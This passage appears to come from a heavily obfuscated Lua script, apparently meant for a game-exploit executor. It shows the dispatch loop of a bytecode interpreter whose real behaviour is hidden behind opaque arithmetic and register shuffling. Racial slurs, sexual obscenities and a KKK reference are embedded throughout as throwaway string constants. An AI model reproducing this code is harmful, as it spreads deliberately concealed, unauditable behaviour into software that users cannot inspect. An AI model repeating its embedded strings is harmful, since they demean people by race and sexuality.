a;l[e[i]]=y[e[U]];o=o+d;e=n[o];l[e[i]]=l[e[c]][e[N]];o=o+d;e=n[o];l[e[r]][e[t]]=e[B];o=o+d;e=n[o];l[e[b]]=y[e[u]];o=o+d;e=n[o];l[e[w]]=l[e[c]][e[_]];o=o+d;e=n[o];l[e[b]]=l[e[t]][e[B]];o=o+d;e=n[o];l[e[i]]=l[e[u]][e[B]];o=o+d;e=n[o];l[e[b]][e[h]]=e[P];o=o+d;e=n[o];l[e[r]]=f[e[c]];o=o+d;e=n[o];a=e[O];k=l[e[t]];l[a+1]=k;l[a]=k[e[_]];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[r]]=l[e[t]][e[P]];o=o+d;e=n[o];l[e[i]]=l[e[u]][e[D]];o=o+d;e=n[o];a=e[x];k=l[e[t]];l[a+1]=k;l[a]=k[e[B]];o=o+d;e=n[o];l[e[w]]=e[t];o=o+d;e=n[o];a=e[i]l[a](s(l,a+S,e[t]))o=o+d;e=n[o];do return end;break end while(a)/((-#'warboy hates you'+(-0x6a+995)))==2203 do l[e[x]]=l[e[U]]-l[e[N]];break end;break;end break;end break;end while(a)/((586-0x161))==3288 do a=(2008818)while C<=(-#'papier ist ein kleiner schwanz lutscher'+(-0x54+186))do a-= a a=(5090493)while C>(0x1ec2/127)do a-= a local a;l[e[x]]=f[e[t]];o=o+d;e=n[o];l[e[x]]=l[e[u]][e[B]];o=o+d;e=n[o];l[e[b]]=l[e[t]];o=o+d;e=n[o];a=e[w]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[O]]();break end while 2661==(a)/((3895-0x7be))do local e=e[x]local n,o=m(l[e](l[e+S]))g=o+e-d local o=0;for e=e,g do o=o+d;l[e]=n[o];end;break end;break;end while 642==(a)/((0xb5cfe/((-17+0x103)+-#"nerd")))do a=(10500076)while C<=(0x95+-85)do a-= a if(l[e[i]]~=e[D])then o=o+S;else o=e[t];end;break;end while 3533==(a)/((0x178d-3057))do a=(445269)while(0xf8-183)<C do a-= a local x;local a;l[e[i]]=f[e[u]];o=o+d;e=n[o];l[e[i]]=l[e[k]][e[P]];o=o+d;e=n[o];l[e[w]]=e[c];o=o+d;e=n[o];l[e[i]]=y[e[U]];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[i]]=l[e[c]][e[D]];o=o+d;e=n[o];l[e[r]]=l[e[k]][e[N]];o=o+d;e=n[o];a=e[r];x=l[e[c]];l[a+1]=x;l[a]=x[e[P]];break end while(a)/((-0x24+1477))==309 do local e={l,e};e[S][e[p][r]]=e[d][e[p][P]]+e[S][e[p][u]];break end;break;end break;end break;end break;end while(a)/(((0x9fc+-117)+-#[[cilerteddoesntlikeburgers]]))==79 do a=(2372150)while C<=(0x174c/(177+-0x5d))do a-= a a=(2494440)while C<=(181-0x71)do a-= a a=(1762100)while(0x102-191)<C do a-= a local r;local a;l[e[O]]=f[e[k]];o=o+d;e=n[o];l[e[x]]=l[e[U]][e[B]];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];l[e[x]]=y[e[h]];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];l[e[i]]=l[e[h]][e[D]];o=o+d;e=n[o];l[e[b]]=l[e[u]][e[M]];o=o+d;e=n[o];a=e[w];r=l[e[h]];l[a+1]=r;l[a]=r[e[M]];break end while 1052==(a)/((0x2c92f/(243-0x86)))do local h;local a;l[e[b]]=f[e[U]];o=o+d;e=n[o];l[e[r]]=f[e[c]];o=o+d;e=n[o];a=e[r];h=l[e[U]];l[a+1]=h;l[a]=h[e[B]];o=o+d;e=n[o];l[e[O]]=e[u];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[i]]=l[e[c]][e[P]];o=o+d;e=n[o];l[e[w]]=l[e[U]][e[_]];o=o+d;e=n[o];a=e[b]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[b]]();o=o+d;e=n[o];do return end;break end;break;end while 1640==(a)/((1559+-0x26))do a=(1281550)while C<=((12325/0x91)+-#'warboy hates you')do a-= a l[e[w]]=A(v[e[t]],nil,f);break;end while 3550==(a)/((35739/(0x37b/9)))do a=(2032418)while(0x88+-66)<C do a-= a local x;local t,k;local h;local a;l[e[b]]=f[e[U]];o=o+d;e=n[o];l[e[i]]=f[e[u]];o=o+d;e=n[o];a=e[b];h=l[e[c]];l[a+1]=h;l[a]=h[e[_]];o=o+d;e=n[o];l[e[w]]=e[c];o=o+d;e=n[o];a=e[w]t,k=m(l[a](s(l,a+1,e[u])))g=k+a-1 x=0;for e=a,g do x=x+d;l[e]=t[x];end;o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,g))o=o+d;e=n[o];l[e[r]]();o=o+d;e=n[o];do return end;break end while(a)/((-#[[big niggers sucking cock]]+(0x4900e/114)))==782 do local w;local a;l[e[r]]=f[e[k]];o=o+d;e=n[o];l[e[b]]=l[e[u]][e[D]];o=o+d;e=n[o];l[e[x]]=e[c];o=o+d;e=n[o];l[e[O]]=y[e[t]];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[x]]=l[e[c]][e[D]];o=o+d;e=n[o];l[e[O]]=l[e[c]][e[D]];o=o+d;e=n[o];a=e[i];w=l[e[t]];l[a+1]=w;l[a]=w[e[B]];break end;break;end break;end break;end while 2090==(a)/(((1219+-0x3c)+-#[[0nly 1337 smashed ur wap]]))do a=(5029310)while C<=(-83+0x9c)do a-= a a=(4153128)while((1185/0xf)+-#"elbicho")<C do a-= a local a;a=e[r]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[x]][e[U]]=l[e[P]];o=o+d;e=n[o];l[e[r]][e[k]]=e[N];o=o+d;e=n[o];l[e[w]]=f[e[u]];o=o+d;e=n[o];l[e[O]]=l[e[k]][e[N]];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];l[e[b]]=e[U];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[b]][e[h]]=l[e[D]];o=o+d;e=n[o];l[e[x]]=f[e[k]];o=o+d;e=n[o];l[e[w]]=l[e[h]][e[P]];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];l[e[x]]=e[t];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];l[e[O]]=e[t];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[r]][e[u]]=l[e[B]];o=o+d;e=n[o];l[e[i]]=f[e[u]];o=o+d;e=n[o];l[e[w]]=l[e[h]][e[_]];o=o+d;e=n[o];l[e[i]]=l[e[t]][e[D]];o=o+d;e=n[o];l[e[O]][e[u]]=l[e[_]];o=o+d;e=n[o];l[e[r]][e[c]]=e[P];o=o+d;e=n[o];l[e[r]]=f[e[t]];o=o+d;e=n[o];l[e[i]]=l[e[U]][e[D]];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];l[e[r]]=e[t];o=o+d;e=n[o];l[e[b]]=e[t];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[x]][e[U]]=l[e[B]];o=o+d;e=n[o];l[e[w]][e[u]]=e[N];o=o+d;e=n[o];l[e[w]][e[c]]=e[P];o=o+d;e=n[o];l[e[b]][e[u]]=e[P];o=o+d;e=n[o];l[e[w]][e[h]]=e[N];o=o+d;e=n[o];l[e[b]][e[U]]=l[e[M]];o=o+d;e=n[o];l[e[b]]=f[e[k]];o=o+d;e=n[o];l[e[i]]=l[e[t]][e[N]];o=o+d;e=n[o];l[e[w]]=e[k];o=o+d;e=n[o];l[e[x]]=e[U];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[O]][e[u]]=l[e[D]];o=o+d;e=n[o];l[e[r]][e[k]]=e[_];o=o+d;e=n[o];l[e[r]]=f[e[c]];o=o+d;e=n[o];l[e[x]]=l[e[U]][e[M]];o=o+d;e=n[o];l[e[x]]=e[U];o=o+d;e=n[o];l[e[x]]=e[c];o=o+d;e=n[o];l[e[b]]=e[h];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[r]][e[U]]=l[e[M]];o=o+d;e=n[o];l[e[w]]=f[e[u]];o=o+d;e=n[o];l[e[r]]=l[e[u]][e[N]];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];l[e[x]]=e[t];o=o+d;e=n[o];l[e[O]]=e[u];o=o+d;e=n[o];l[e[O]]=e[U];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[w]][e[t]]=l[e[D]];o=o+d;e=n[o];l[e[r]]=f[e[t]];o=o+d;e=n[o];l[e[i]]=l[e[t]][e[D]];o=o+d;e=n[o];l[e[b]]=l[e[k]][e[D]];o=o+d;e=n[o];l[e[O]][e[U]]=l[e[M]];o=o+d;e=n[o];l[e[b]][e[c]]=e[M];o=o+d;e=n[o];l[e[x]]=f[e[t]];o=o+d;e=n[o];l[e[i]]=l[e[u]][e[N]];o=o+d;e=n[o];l[e[O]]=e[t];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];l[e[b]]=e[U];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[x]][e[u]]=l[e[D]];o=o+d;e=n[o];l[e[x]][e[U]]=e[P];o=o+d;e=n[o];l[e[x]][e[h]]=e[B];o=o+d;e=n[o];l[e[x]][e[t]]=e[N];o=o+d;e=n[o];l[e[O]][e[c]]=l[e[B]];o=o+d;e=n[o];l[e[O]]=f[e[u]];o=o+d;e=n[o];l[e[x]]=l[e[k]][e[B]];o=o+d;e=n[o];l[e[b]]=e[t];o=o+d;e=n[o];l[e[i]]=e[c];break end while(a)/((0xa23-1338))==3304 do local a=e[w];local r=e[_];local n=a+2 local a={l[a](l[a+1],l[n])};for e=1,r do l[n+e]=a[e];end;local a=a[1]if a then l[n]=a o=e[h];else o=o+d;end;break end;break;end while(a)/((2971-0x605))==3517 do a=(7471422)while C<=(0xcb8/(-0x72+158))do a-= a local a;l[e[O]]=f[e[c]];o=o+d;e=n[o];l[e[x]]=l[e[U]][e[_]];o=o+d;e=n[o];l[e[r]]=l[e[h]];o=o+d;e=n[o];a=e[i]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[i]]();break;end while(a)/((0x158e-(5728-0xb67)))==2758 do a=(1895972)while(-#"if syn then haxor alert end"+(-68+0xaa))<C do a-= a l[e[r]]=l[e[c]][l[e[M]]];break end while(a)/((0x14e0-(2748+-0x1e)))==722 do local a;l[e[b]][e[c]]=l[e[M]];o=o+d;e=n[o];l[e[i]]=f[e[c]];o=o+d;e=n[o];l[e[x]]=l[e[h]][e[_]];o=o+d;e=n[o];l[e[w]]=e[c];o=o+d;e=n[o];l[e[b]]=e[k];o=o+d;e=n[o];l[e[b]]=e[U];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[b]][e[h]]=l[e[M]];o=o+d;e=n[o];l[e[r]]=f[e[t]];o=o+d;e=n[o];l[e[i]]=l[e[c]][e[N]];o=o+d;e=n[o];l[e[i]]=e[t];o=o+d;e=n[o];l[e[r]]=e[c];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[O]][e[k]]=l[e[P]];o=o+d;e=n[o];l[e[O]]=f[e[U]];o=o+d;e=n[o];l[e[x]]=l[e[h]][e[_]];o=o+d;e=n[o];l[e[i]]=l[e[c]][e[_]];o=o+d;e=n[o];l[e[i]][e[k]]=l[e[N]];o=o+d;e=n[o];l[e[O]][e[U]]=e[M];o=o+d;e=n[o];l[e[r]]=f[e[t]];o=o+d;e=n[o];l[e[i]]=l[e[U]][e[P]];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];l[e[x]]=e[t];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[b]][e[u]]=l[e[D]];o=o+d;e=n[o];l[e[w]][e[k]]=e[D];o=o+d;e=n[o];l[e[b]][e[c]]=e[M];o=o+d;e=n[o];l[e[w]]=f[e[h]];o=o+d;e=n[o];l[e[w]]=l[e[u]][e[D]];o=o+d;e=n[o];l[e[b]]=e[t];o=o+d;e=n[o];l[e[O]]=e[U];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[w]][e[c]]=l[e[D]];o=o+d;e=n[o];l[e[x]][e[u]]=l[e[D]];o=o+d;e=n[o];l[e[O]][e[c]]=e[D];o=o+d;e=n[o];l[e[O]][e[U]]=l[e[N]];o=o+d;e=n[o];l[e[x]]=f[e[t]];o=o+d;e=n[o];l[e[b]]=l[e[k]][e[_]];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[b]][e[c]]=l[e[D]];o=o+d;e=n[o];l[e[i]][e[t]]=e[D];o=o+d;e=n[o];l[e[b]]=f[e[U]];o=o+d;e=n[o];l[e[i]]=l[e[u]][e[N]];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];l[e[i]]=e[U];o=o+d;e=n[o];l[e[i]]=e[k];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[O]][e[k]]=l[e[B]];o=o+d;e=n[o];l[e[O]]=f[e[k]];o=o+d;e=n[o];l[e[i]]=l[e[k]][e[D]];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];l[e[i]]=e[k];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[r]][e[u]]=l[e[B]];o=o+d;e=n[o];l[e[w]]=f[e[t]];o=o+d;e=n[o];l[e[r]]=l[e[U]][e[N]];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];l[e[i]]=e[U];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[i]][e[h]]=l[e[D]];o=o+d;e=n[o];l[e[i]][e[k]]=e[N];o=o+d;e=n[o];l[e[b]]=f[e[h]];o=o+d;e=n[o];l[e[r]]=l[e[u]][e[P]];o=o+d;e=n[o];l[e[r]]=l[e[c]][e[_]];o=o+d;e=n[o];l[e[b]][e[u]]=l[e[N]];o=o+d;e=n[o];l[e[r]][e[k]]=e[P];o=o+d;e=n[o];l[e[w]]=f[e[t]];o=o+d;e=n[o];l[e[x]]=l[e[U]][e[P]];o=o+d;e=n[o];l[e[r]]=e[t];break end;break;end break;end break;end break;end break;end break;end break;end while 238==(a)/(((0x37b-488)+-#"Impulse youtube real"))do a=(5867680)while((-0x13+158)+-#"cilerteddoesntlikeburgers")>=C do a-= a a=(91200)while C<=(19760/0xd0)do a-= a a=(6764870)while(((-0x74+21642)/229)+-#'Deezbutts')>=C do a-= a a=(2360370)while(-#"warboy hates you"+(0xdf-127))>=C do a-= a a=(9568020)while(-0x14+98)>=C do a-= a a=(1892000)while(15477/0xc9)<C do a-= a local t;local _,u;local a;l[e[x]]=f[e[k]];o=o+d;e=n[o];l[e[O]]=l[e[h]][e[P]];o=o+d;e=n[o];l[e[i]]=e[U];o=o+d;e=n[o];l[e[r]]=f[e[h]];o=o+d;e=n[o];l[e[b]]=l[e[c]][e[B]];o=o+d;e=n[o];l[e[r]]=e[h];o=o+d;e=n[o];l[e[w]]=e[k];o=o+d;e=n[o];l[e[i]]=e[U];o=o+d;e=n[o];a=e[r]_,u=m(l[a](s(l,a+1,e[c])))g=u+a-1 t=0;for e=a,g do t=t+d;l[e]=_[t];end;o=o+d;e=n[o];a=e[b]_,u=m(l[a](s(l,a+d,g)))g=u+a-S t=0;for e=a,g do t=t+d;l[e]=_[t];end;break end while(a)/(((324276/0xb7)+-#'deadphonelua'))==1075 do if(l[e[b]]==l[e[D]])then o=o+S;else o=e[h];end;break end;break;end while(a)/((-#'0nly segc'+(282960/0x5a)))==3052 do a=(2291040)while(-#[[deadphonelua]]+(259-0xa8))<C do a-= a local o=e[x]l[o]=l[o](s(l,o+d,e[U]))break end while(a)/(((0x5bcb0/126)+-#'big niggers sucking cock'))==774 do local d=e[w];local a=l[d+2];local n=l[d]+a;l[d]=n;if(a>0)then if(n<=l[d+1])then o=e[U];l[d+3]=n;end elseif(n>=l[d+1])then o=e[u];l[d+3]=n;end break end;break;end break;end while(a)/((-0x1f+3926))==606 do a=(1647954)while C<=(-#'big niggers sucking cock'+(236-(0xa28/20)))do a-= a a=(11821821)while C>(9153/((0x179-252)+-#"Lana Rhoades"))do a-= a l[e[b]]=y[e[k]];break end while 3369==(a)/(((0x1c37-3649)+-0x41))do local e=e[r]local n,o=m(l[e](s(l,e+d,g)))g=o+e-S local o=0;for e=e,g do o=o+d;l[e]=n[o];end;break end;break;end while(a)/((189486/0xc6))==1722 do a=(1004856)while C<=(-0x74+199)do a-= a local a;a=e[O]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[O]][e[t]]=l[e[M]];o=o+d;e=n[o];l[e[w]][e[c]]=e[P];o=o+d;e=n[o];l[e[i]][e[h]]=e[P];o=o+d;e=n[o];l[e[r]][e[u]]=e[N];o=o+d;e=n[o];l[e[b]][e[U]]=e[D];o=o+d;e=n[o];l[e[w]][e[u]]=l[e[P]];o=o+d;e=n[o];l[e[w]]=f[e[h]];o=o+d;e=n[o];l[e[r]]=l[e[t]][e[B]];o=o+d;e=n[o];l[e[r]]=e[t];o=o+d;e=n[o];l[e[i]]=e[U];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[w]][e[h]]=l[e[B]];o=o+d;e=n[o];l[e[x]]=f[e[U]];o=o+d;e=n[o];l[e[r]]=l[e[t]][e[_]];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];l[e[r]]=e[h];o=o+d;e=n[o];l[e[b]]=e[k];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[x]][e[c]]=l[e[M]];o=o+d;e=n[o];l[e[w]][e[t]]=e[D];o=o+d;e=n[o];l[e[O]]=f[e[u]];o=o+d;e=n[o];l[e[i]]=l[e[h]][e[B]];o=o+d;e=n[o];l[e[r]]=e[t];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[b]][e[h]]=l[e[_]];o=o+d;e=n[o];l[e[w]]=f[e[c]];o=o+d;e=n[o];l[e[w]]=l[e[u]][e[_]];o=o+d;e=n[o];l[e[x]]=e[U];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];l[e[w]]=e[c];o=o+d;e=n[o];l[e[x]]=e[c];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[x]][e[U]]=l[e[D]];o=o+d;e=n[o];l[e[b]][e[h]]=e[M];o=o+d;e=n[o];l[e[b]][e[t]]=l[e[P]];o=o+d;e=n[o];l[e[O]]=f[e[h]];o=o+d;e=n[o];l[e[w]]=l[e[c]][e[_]];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];l[e[i]]=e[k];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[w]][e[U]]=l[e[P]];o=o+d;e=n[o];l[e[i]][e[u]]=e[_];o=o+d;e=n[o];l[e[b]]=f[e[t]];o=o+d;e=n[o];l[e[O]]=l[e[t]][e[M]];o=o+d;e=n[o];l[e[b]]=e[U];o=o+d;e=n[o];l[e[i]]=e[t];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];l[e[x]]=e[u];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[b]][e[h]]=l[e[P]];o=o+d;e=n[o];l[e[w]]=f[e[c]];o=o+d;e=n[o];l[e[b]]=l[e[u]][e[D]];o=o+d;e=n[o];l[e[r]]=e[c];o=o+d;e=n[o];l[e[i]]=e[u];o=o+d;e=n[o];l[e[x]]=e[c];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[b]][e[U]]=l[e[D]];o=o+d;e=n[o];l[e[r]]=f[e[h]];o=o+d;e=n[o];l[e[b]]=l[e[c]][e[M]];o=o+d;e=n[o];l[e[b]]=l[e[c]][e[P]];o=o+d;e=n[o];l[e[r]][e[c]]=l[e[N]];o=o+d;e=n[o];l[e[r]][e[c]]=e[N];o=o+d;e=n[o];l[e[r]]=f[e[u]];o=o+d;e=n[o];l[e[r]]=l[e[U]][e[P]];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];l[e[i]]=e[u];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[r]][e[t]]=l[e[P]];o=o+d;e=n[o];l[e[x]][e[U]]=e[D];o=o+d;e=n[o];l[e[i]][e[h]]=e[_];o=o+d;e=n[o];l[e[x]][e[t]]=e[B];o=o+d;e=n[o];l[e[w]][e[k]]=e[M];break;end while(a)/(((-59+0x2a0)+-#'Impulse real 2022'))==1686 do a=(2749500)while((127+-0x1b)+-#'0nly was here mf')<C do a-= a local r;local k,U;local w;local a;l[e[x]]=f[e[t]];o=o+d;e=n[o];l[e[O]]=f[e[c]];o=o+d;e=n[o];a=e[b];w=l[e[t]];l[a+1]=w;l[a]=w[e[P]];o=o+d;e=n[o];l[e[x]]=e[t];o=o+d;e=n[o];a=e[i]k,U=m(l[a](s(l,a+1,e[h])))g=U+a-1 r=0;for e=a,g do r=r+d;l[e]=k[r];end;o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,g))o=o+d;e=n[o];l[e[i]]();o=o+d;e=n[o];do return end;break end while(a)/((-118+0x6cf))==1692 do local w;local a;l[e[r]]=f[e[t]];o=o+d;e=n[o];l[e[x]]=l[e[u]][e[D]];o=o+d;e=n[o];l[e[O]]=e[c];o=o+d;e=n[o];l[e[i]]=y[e[h]];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[i]]=l[e[t]][e[P]];o=o+d;e=n[o];l[e[b]]=l[e[t]][e[M]];o=o+d;e=n[o];a=e[x];w=l[e[t]];l[a+1]=w;l[a]=w[e[D]];break end;break;end break;end break;end break;end while(a)/((0x100a+-96))==1687 do a=(1788416)while C<=(0xa3+-73)do a-= a a=(8896446)while(122+(-#'Gay porn'+(0x9+-36)))>=C do a-= a a=(9221655)while(0x76+-32)<C do a-= a l[e[r]]=y[e[U]];o=o+d;e=n[o];l[e[x]]=#l[e[k]];o=o+d;e=n[o];y[e[c]]=l[e[w]];o=o+d;e=n[o];l[e[O]]=y[e[u]];o=o+d;e=n[o];l[e[i]]=#l[e[U]];o=o+d;e=n[o];y[e[h]]=l[e[r]];o=o+d;e=n[o];do return end;break end while 2631==(a)/((-0x2d+3550))do l[e[b]]=(e[k]~=0);break end;break;end while(a)/((0x44fbb/105))==3306 do a=(2524473)while C<=(-#"how to join the kkk"+(0xc8+-93))do a-= a f[e[t]]=l[e[x]];o=o+d;e=n[o];l[e[r]]={};o=o+d;e=n[o];l[e[w]]={};o=o+d;e=n[o];f[e[t]]=l[e[w]];o=o+d;e=n[o];l[e[r]]=f[e[U]];o=o+d;e=n[o];if(l[e[O]]~=e[D])then o=o+S;else o=e[u];end;break;end while 2109==(a)/((2416-0x4c3))do a=(989168)while C>((0x10c-174)+-#[[Negro]])do a-= a local c;local w,t;local b;local a;l[e[x]]=f[e[u]];o=o+d;e=n[o];l[e[i]]=f[e[h]];o=o+d;e=n[o];a=e[i];b=l[e[h]];l[a+1]=b;l[a]=b[e[B]];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];l[e[i]]=(e[k]~=0);o=o+d;e=n[o];a=e[i]w,t=m(l[a](s(l,a+1,e[U])))g=t+a-1 c=0;for e=a,g do c=c+d;l[e]=w[c];end;o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,g))o=o+d;e=n[o];l[e[r]]();o=o+d;e=n[o];do return end;break end while 3376==(a)/(((722-0x17d)+-#[[never gonna give you up never gonna let you down]]))do do return end;break end;break;end break;end break;end while 512==(a)/((7107-0xe1e))do a=(3287440)while C<=(-#[[0nly segc]]+(-0x35+154))do a-= a a=(897390)while(((-35+0xfc)+-#[[panzerfaust]])-0x73)<C do a-= a local i;local b,w;local h;local a;l[e[r]]=f[e[u]];o=o+d;e=n[o];l[e[O]]=f[e[U]];o=o+d;e=n[o];a=e[r];h=l[e[c]];l[a+1]=h;l[a]=h[e[N]];o=o+d;e=n[o];l[e[O]]=e[u];o=o+d;e=n[o];a=e[x]b,w=m(l[a](s(l,a+1,e[U])))g=w+a-1 i=0;for e=a,g do i=i+d;l[e]=b[i];end;o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,g))o=o+d;e=n[o];l[e[O]]();o=o+d;e=n[o];do return end;break end while(a)/((0x3b6a/30))==1770 do l[e[w]]=y[e[u]];break end;break;end while(a)/((76960/0x4a))==3161 do a=(4107705)while(0xd0+-115)>=C do a-= a l[e[b]]=l[e[h]][e[B]];break;end while 3857==(a)/((0x872-1097))do a=(2343112)while(-124+0xda)<C do a-= a local a;l[e[b]]=e[h];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[O]][e[c]]=l[e[M]];o=o+d;e=n[o];l[e[i]]=f[e[k]];o=o+d;e=n[o];l[e[b]]=l[e[t]][e[B]];o=o+d;e=n[o];l[e[b]]=e[U];o=o+d;e=n[o];l[e[O]]=e[c];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[b]][e[u]]=l[e[P]];o=o+d;e=n[o];l[e[i]]=f[e[t]];o=o+d;e=n[o];l[e[i]]=l[e[u]][e[P]];o=o+d;e=n[o];l[e[x]]=l[e[k]][e[B]];o=o+d;e=n[o];l[e[O]][e[u]]=l[e[B]];o=o+d;e=n[o];l[e[b]][e[c]]=e[B];o=o+d;e=n[o];l[e[O]]=f[e[h]];o=o+d;e=n[o];l[e[x]]=l[e[U]][e[_]];o=o+d;e=n[o];l[e[i]]=e[U];o=o+d;e=n[o];l[e[x]]=e[c];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[w]][e[k]]=l[e[M]];o=o+d;e=n[o];l[e[r]][e[t]]=e[_];o=o+d;e=n[o];l[e[w]][e[c]]=e[D];o=o+d;e=n[o];l[e[x]][e[c]]=e[_];o=o+d;e=n[o];l[e[x]][e[t]]=e[B];o=o+d;e=n[o];l[e[x]][e[k]]=l[e[N]];o=o+d;e=n[o];l[e[i]]=f[e[k]];o=o+d;e=n[o];l[e[r]]=l[e[h]][e[_]];o=o+d;e=n[o];l[e[b]]=e[k];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];l[e[r]]=e[h];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[i]][e[U]]=l[e[B]];o=o+d;e=n[o];l[e[w]][e[c]]=e[M];o=o+d;e=n[o];l[e[b]]=f[e[U]];o=o+d;e=n[o];l[e[b]]=l[e[u]][e[P]];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];l[e[i]]=e[t];o=o+d;e=n[o];l[e[b]]=e[h];o=o+d;e=n[o];l[e[x]]=e[u];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[x]][e[U]]=l[e[M]];o=o+d;e=n[o];l[e[b]]=f[e[k]];o=o+d;e=n[o];l[e[x]]=l[e[U]][e[_]];o=o+d;e